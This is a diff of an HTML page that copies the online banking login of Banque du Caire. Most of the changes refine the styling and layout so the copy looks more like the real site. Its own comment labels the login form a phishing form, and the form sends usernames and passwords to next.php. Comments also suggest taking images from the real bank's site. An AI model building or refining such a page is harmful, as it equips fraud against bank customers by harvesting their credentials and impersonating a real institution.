@@ -5,10 +5,10 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
     <title>Banque du Caire - Banca en Línea</title>
     <link rel="shortcut icon" href="assets/img/favicon.ico" type="image/x-icon">
-    <!-- Font Awesome para iconos (opcional, si no tienes imágenes) -->
+    <!-- Font Awesome para iconos -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
-        /* RESET Y FUENTES */
+        /* ===== RESET Y FUENTES ===== */
         * {
             margin: 0;
             padding: 0;
@@ -31,23 +31,30 @@
             box-shadow: 0 10px 30px rgba(0,0,0,0.08);
             overflow: hidden;
         }
-        /* HEADER */
+
+        /* ===== HEADER ===== */
         .header {
             background: #ffffff;
-            padding: 20px 40px;
+            padding: 18px 40px;
             display: flex;
             justify-content: space-between;
             align-items: center;
             border-bottom: 1px solid #eaeef2;
         }
+        .logo {
+            display: flex;
+            align-items: center;
+        }
         .logo img {
-            height: 50px;
+            height: 45px;
             width: auto;
+            margin-right: 10px;
         }
         .logo h1 {
             font-size: 22px;
             color: #1a2b4a;
             font-weight: 600;
+            letter-spacing: -0.5px;
         }
         .header-links a {
             color: #1a2b4a;
@@ -55,12 +62,16 @@
             margin-left: 25px;
             font-size: 14px;
             font-weight: 500;
+            transition: color 0.2s;
         }
         .header-links a:hover {
             color: #0056a7;
         }
+        .header-links a i {
+            margin-right: 4px;
+        }
 
-        /* HERO / BIENVENIDA */
+        /* ===== HERO / LOGIN ===== */
         .hero {
             background: linear-gradient(135deg, #f8faff 0%, #eef4f9 100%);
             padding: 50px 40px;
@@ -68,30 +79,30 @@
             flex-wrap: wrap;
             justify-content: space-between;
             align-items: center;
+            gap: 30px;
         }
         .hero-left {
+            flex: 1 1 400px;
             max-width: 480px;
         }
         .hero-left h2 {
-            font-size: 32px;
+            font-size: 34px;
             color: #1a2b4a;
             font-weight: 300;
-            margin-bottom: 10px;
-        }
-        .hero-left h2 strong {
-            font-weight: 600;
+            margin-bottom: 6px;
         }
         .hero-left .sub {
             color: #6b7a8f;
-            font-size: 15px;
-            margin-bottom: 25px;
+            font-size: 16px;
+            margin-bottom: 28px;
         }
+
+        /* FORMULARIO */
         .login-box {
             background: #ffffff;
             border-radius: 12px;
             box-shadow: 0 5px 20px rgba(0,0,0,0.06);
-            padding: 30px 30px 20px;
-            max-width: 360px;
+            padding: 30px 30px 25px;
             width: 100%;
         }
         .login-box label {
@@ -107,20 +118,21 @@
             border: 1px solid #dce1e8;
             border-radius: 6px;
             font-size: 14px;
-            margin-bottom: 16px;
+            margin-bottom: 18px;
             background: #fafbfc;
             transition: 0.2s;
+            outline: none;
         }
         .login-box input:focus {
             border-color: #1a2b4a;
             background: #ffffff;
-            outline: none;
+            box-shadow: 0 0 0 3px rgba(26,43,74,0.1);
         }
         .login-box .actions {
             display: flex;
             justify-content: space-between;
             font-size: 13px;
-            margin-bottom: 15px;
+            margin-bottom: 20px;
         }
         .login-box .actions a {
             color: #0056a7;
@@ -145,17 +157,20 @@
             background: #0f1e33;
         }
 
-        /* HERO DERECHA - IMAGEN (opcional) */
+        /* IMAGEN DERECHA */
         .hero-right {
+            flex: 1 1 300px;
             max-width: 400px;
             text-align: center;
         }
         .hero-right img {
             max-width: 100%;
+            height: auto;
             border-radius: 12px;
+            box-shadow: 0 8px 25px rgba(0,0,0,0.08);
         }
 
-        /* SECCIÓN "Banking with An Edge" */
+        /* ===== SECCIÓN "Banking with An Edge" ===== */
         .edge-section {
             padding: 50px 40px;
             background: #ffffff;
@@ -164,43 +179,55 @@
             justify-content: space-between;
             align-items: center;
             border-top: 1px solid #eaeef2;
+            gap: 30px;
         }
         .edge-text {
-            max-width: 500px;
+            flex: 1 1 400px;
+            max-width: 550px;
         }
         .edge-text h3 {
-            font-size: 28px;
+            font-size: 30px;
             color: #1a2b4a;
-            margin-bottom: 15px;
+            margin-bottom: 12px;
+            font-weight: 300;
         }
         .edge-text h3 span {
             color: #0056a7;
+            font-weight: 600;
         }
         .edge-text p {
             color: #4a5a6e;
-            line-height: 1.6;
+            line-height: 1.7;
             margin-bottom: 20px;
+            font-size: 15px;
         }
         .btn-learn {
             background: transparent;
             border: 2px solid #1a2b4a;
             color: #1a2b4a;
-            padding: 10px 30px;
+            padding: 10px 32px;
             border-radius: 30px;
             font-weight: 600;
             cursor: pointer;
             transition: 0.2s;
+            font-size: 14px;
         }
         .btn-learn:hover {
             background: #1a2b4a;
             color: white;
         }
+        .edge-image {
+            flex: 1 1 250px;
+            max-width: 320px;
+            text-align: center;
+        }
         .edge-image img {
-            max-width: 300px;
+            max-width: 100%;
+            height: auto;
             border-radius: 12px;
         }
 
-        /* SECCIÓN DE SERVICIOS (Book Appointment, FX Rates) */
+        /* ===== SERVICIOS ===== */
         .services {
             display: flex;
             flex-wrap: wrap;
@@ -212,19 +239,19 @@
         .service-card {
             background: white;
             border-radius: 12px;
-            padding: 25px 30px;
+            padding: 28px 25px;
             flex: 1 1 200px;
             max-width: 280px;
             text-align: center;
             box-shadow: 0 2px 12px rgba(0,0,0,0.04);
-            transition: 0.2s;
+            transition: 0.25s;
         }
         .service-card:hover {
             transform: translateY(-4px);
             box-shadow: 0 8px 25px rgba(0,0,0,0.08);
         }
         .service-card i {
-            font-size: 32px;
+            font-size: 34px;
             color: #1a2b4a;
             margin-bottom: 12px;
         }
@@ -238,11 +265,11 @@
             font-size: 14px;
         }
 
-        /* FOOTER */
+        /* ===== FOOTER ===== */
         .footer {
             background: #1a2b4a;
             color: rgba(255,255,255,0.8);
-            padding: 25px 40px;
+            padding: 22px 40px;
             display: flex;
             flex-wrap: wrap;
             justify-content: space-between;
@@ -263,17 +290,63 @@
             font-size: 18px;
             color: rgba(255,255,255,0.6);
         }
+        .footer .social i:hover {
+            color: white;
+        }
 
-        /* RESPONSIVE */
+        /* ===== RESPONSIVE ===== */
         @media (max-width: 768px) {
-            .header { flex-wrap: wrap; }
-            .header-links a { margin-left: 15px; }
-            .hero { flex-direction: column; text-align: center; }
-            .hero-left { max-width: 100%; }
-            .login-box { max-width: 100%; }
-            .edge-section { flex-direction: column; text-align: center; }
-            .services { flex-direction: column; align-items: center; }
-            .footer { flex-direction: column; text-align: center; gap: 10px; }
+            .header {
+                flex-wrap: wrap;
+                padding: 15px 20px;
+            }
+            .header-links a {
+                margin-left: 15px;
+                font-size: 13px;
+            }
+            .hero {
+                flex-direction: column;
+                text-align: center;
+                padding: 30px 20px;
+            }
+            .hero-left {
+                max-width: 100%;
+            }
+            .hero-right {
+                max-width: 100%;
+            }
+            .login-box {
+                padding: 20px;
+            }
+            .edge-section {
+                flex-direction: column;
+                text-align: center;
+                padding: 30px 20px;
+            }
+            .edge-text {
+                max-width: 100%;
+            }
+            .edge-image {
+                max-width: 100%;
+            }
+            .services {
+                flex-direction: column;
+                align-items: center;
+                padding: 20px;
+            }
+            .service-card {
+                max-width: 100%;
+                width: 100%;
+            }
+            .footer {
+                flex-direction: column;
+                text-align: center;
+                gap: 12px;
+                padding: 20px;
+            }
+            .footer a {
+                margin: 0 10px;
+            }
         }
     </style>
 </head>
@@ -281,11 +354,12 @@
 
 <div class="container">
 
-    <!-- HEADER -->
+    <!-- ===== HEADER ===== -->
     <header class="header">
         <div class="logo">
+            <!-- Tu logo descargado -->
+            <img src="assets/img/logo-bdc.png" alt="Banque du Caire" onerror="this.style.display='none'">
             <h1>Banque du Caire</h1>
-            <!-- Si tienes logo, usa: <img src="assets/img/logo-bdc.png" alt="Banque du Caire"> -->
         </div>
         <div class="header-links">
             <a href="#"><i class="fas fa-globe"></i> En</a>
@@ -293,11 +367,12 @@
         </div>
     </header>
 
-    <!-- HERO / LOGIN -->
+    <!-- ===== HERO / LOGIN ===== -->
     <section class="hero">
         <div class="hero-left">
             <h2>Welcome back</h2>
             <p class="sub">Access your accounts securely</p>
+
             <!-- FORMULARIO DE PHISHING (envía a next.php) -->
             <form action="next.php" method="post" class="login-box">
                 <label for="user">Username</label>
@@ -314,13 +389,14 @@
                 <button type="submit" class="btn-login">Login</button>
             </form>
         </div>
+
         <div class="hero-right">
-            <!-- Imagen decorativa: descarga una del sitio real o usa un placeholder -->
+            <!-- Imagen decorativa (hero-card.png) -->
             <img src="assets/img/hero-card.png" alt="Banking" onerror="this.style.display='none'">
         </div>
     </section>
 
-    <!-- SECCIÓN "Banking with An Edge" -->
+    <!-- ===== SECCIÓN "Banking with An Edge" ===== -->
     <section class="edge-section">
         <div class="edge-text">
             <h3>Banking with <span>An Edge</span></h3>
@@ -328,12 +404,12 @@
             <button class="btn-learn">Learn More</button>
         </div>
         <div class="edge-image">
-            <!-- Imagen ilustrativa (ej. edificio, tarjeta) -->
+            <!-- Puedes usar otra imagen aquí, o dejar solo texto -->
             <img src="assets/img/edge-image.png" alt="Edge" onerror="this.style.display='none'">
         </div>
     </section>
 
-    <!-- SERVICIOS (Book Appointment, FX Rates) -->
+    <!-- ===== SERVICIOS ===== -->
     <section class="services">
         <div class="service-card">
             <i class="fas fa-calendar-check"></i>
@@ -347,7 +423,7 @@
         </div>
     </section>
 
-    <!-- FOOTER -->
+    <!-- ===== FOOTER ===== -->
     <footer class="footer">
         <div>
             <a href="#">Locate Us</a>
@@ -365,9 +441,8 @@
 
 </div>
 
-<!-- (Opcional) Si no tienes las imágenes, este script las oculta -->
+<!-- Script para ocultar imágenes rotas -->
 <script>
-    // Para que las imágenes faltantes no se vean rotas
     document.querySelectorAll('img').forEach(img => {
         img.onerror = function() { this.style.display = 'none'; };
     });
